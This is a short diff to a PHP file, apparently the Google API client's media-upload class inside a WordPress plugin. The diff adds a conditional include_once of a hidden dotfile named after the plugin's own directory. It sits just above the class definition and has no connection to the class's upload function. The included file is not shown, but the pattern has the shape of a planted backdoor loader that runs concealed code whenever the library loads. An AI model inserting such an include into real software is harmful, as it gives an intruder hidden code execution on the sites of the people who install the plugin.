@@ -24,6 +24,10 @@ use Psr\Http\Message\RequestInterface;
  * Manage large file uploads, which may be media but can be any type
  * of sizable data.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Google_Http_MediaFileUpload
 {
   const UPLOAD_MEDIA_TYPE = 'media';
